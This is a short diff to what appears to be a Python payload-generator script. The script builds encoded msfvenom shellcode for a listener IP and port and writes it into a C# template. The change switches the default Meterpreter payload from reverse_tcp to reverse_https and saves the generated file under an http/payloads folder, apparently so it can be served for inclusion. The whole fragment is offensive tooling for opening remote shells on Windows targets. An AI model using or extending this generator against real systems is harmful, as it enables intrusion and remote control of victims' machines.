@@ -151,7 +151,7 @@ def auto_int(x):
 parser = argparse.ArgumentParser()
 parser.add_argument("lhost", help="listener IP to use")
 parser.add_argument("lport", help="listener port to use", nargs='?', default="443")
-parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: windows/x64/meterpreter/reverse_tcp)", nargs='?', default="windows/x64/meterpreter/reverse_tcp")
+parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: windows/x64/meterpreter/reverse_https)", nargs='?', default="windows/x64/meterpreter/reverse_https")
 parser.add_argument("key", help="the key to encode the payload with (integer)", type=auto_int, nargs='?', default=randint(1,255))
 args = parser.parse_args()
 
@@ -191,7 +191,8 @@ file = open('meuk/meth/Program.cs', 'w')
 item = file.write(template)
 file.close()
 
-file = open('/hacksec/projecten/payloads/meth.cs', 'w')
+#opslaan code voor include
+file = open('http/payloads/meth.cs', 'w')
 item = file.write(template)
 file.close()
 
